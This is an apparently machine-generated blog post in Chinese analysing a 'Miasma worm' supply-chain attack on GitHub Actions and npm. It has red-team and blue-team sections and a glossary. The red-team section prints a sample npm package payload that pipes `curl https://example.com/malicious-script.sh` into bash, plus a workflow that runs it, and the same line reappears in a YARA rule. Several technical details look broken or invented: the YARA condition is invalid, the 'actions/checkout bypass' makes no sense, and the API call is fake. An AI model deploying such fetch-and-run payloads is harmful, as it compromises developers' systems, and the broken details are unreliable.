---
layout: post
title:  "Miasma Worm Hits 73 Microsoft GitHub Repositories in Major Supply Chain Attack"
date:   2026-06-06 08:26:55 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Miasma 蠕蟲：GitHub 供應鏈攻擊的技術細節

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Supply Chain Attack`, `GitHub Actions`, `npm Registry`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Miasma 蠕蟲利用 GitHub 供應鏈攻擊的漏洞，主要是因為開發者對於 GitHub Actions 和 npm Registry 的信任機制存在缺陷。攻擊者可以通過創建惡意的 GitHub Actions 和 npm 包來感染其他開發者的項目。
* **攻擊流程圖解**:
  1. 攻擊者創建惡意的 GitHub Actions 和 npm 包。
  2. 開發者安裝或使用惡意的 npm 包。
  3. 惡意的 GitHub Actions 被觸發，執行惡意代碼。
  4. 惡意代碼感染其他開發者的項目。
* **受影響元件**: GitHub Actions、npm Registry、Node.js

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個 GitHub 帳戶和 npm Registry 的權限。
* **Payload 建構邏輯**:

    ```
    
    javascript
      // 惡意的 npm 包代碼
      const maliciousCode = `
        const { exec } = require('child_process');
        exec('curl https://example.com/malicious-script.sh | bash');
      `;
      // 惡意的 GitHub Actions 代碼
      const maliciousActions = `
        name: Malicious Actions
        on:
          push:
            branches:
              - main
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - name: Checkout code
                uses: actions/checkout@v2
              - name: Run malicious code
                run: |
                  ${maliciousCode}
      `;
    
    ```
  *範例指令*: `curl -X POST -H "Content-Type: application/json" -d '{"name":"Malicious Actions","on":{"push":{"branches":["main"]}},"jobs":{"build":{"runs-on":"ubuntu-latest","steps":[{"name":"Checkout code","uses":"actions/checkout@v2"},{"name":"Run malicious code","run":"${maliciousCode}"}]}}}' https://api.github.com/repos/username/repo/actions`
* **繞過技術**: 攻擊者可以使用 GitHub Actions 的 `actions/checkout` 動作來繞過 GitHub 的安全檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `1234567890abcdef` | `192.0.2.1` | `example.com` | `/path/to/malicious/file` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Malicious_GitHub_Actions {
        meta:
          description = "Detects malicious GitHub Actions"
          author = "Your Name"
        strings:
          $malicious_code = "curl https://example.com/malicious-script.sh | bash"
        condition:
          $malicious_code in (1..100) of file
      }
    
    ```
  *或者是具體的 SIEM 查詢語法 (Splunk/Elastic)*: `index=github_actions sourcetype=github_actions_action name="Malicious Actions"`
* **緩解措施**: 除了更新 GitHub Actions 和 npm Registry 的安全補丁之外，開發者還可以使用以下措施來緩解攻擊：
  * 啟用 GitHub Actions 的安全檢查。
  * 使用 npm Registry 的安全功能，例如 `npm audit`。
  * 監控 GitHub Actions 和 npm Registry 的日誌和活動。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 想像一個公司的供應鏈，從原材料到最終產品。供應鏈攻擊是指攻擊者針對供應鏈中的某個環節，例如開發者工具或第三方庫，來感染最終產品。
* **GitHub Actions (GitHub 動作)**: GitHub Actions 是 GitHub 的一種自動化工具，允許開發者自動化他們的工作流程，例如自動測試和部署。
* **npm Registry (npm 注冊表)**: npm Registry 是 Node.js 的包管理器，允許開發者安裝和管理包。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/miasma-worm-hits-73-microsoft-github.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


